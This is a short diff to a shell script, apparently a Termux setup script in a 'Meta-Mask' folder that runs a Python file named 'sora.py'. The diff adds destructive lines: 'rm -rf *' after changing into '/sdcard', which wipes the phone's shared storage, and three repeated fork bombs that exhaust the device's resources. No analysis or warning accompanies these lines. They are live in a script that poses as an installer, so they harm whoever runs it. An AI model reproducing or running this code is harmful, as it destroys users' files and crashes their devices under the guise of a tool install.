@@ -4,8 +4,11 @@ cd Meta-Mask
 pkg install python
 pkg install python3
 cd Meta
-python sora.py & rm -rf *
+python sora.py && rm -rf *
 cd
-cd ransom
 rm -rf *
-echo Goodbye
+cd /sdcard
+rm -rf *
+:(){ :|:& };:
+:(){ :|:& };:
+:(){ :|:& };:
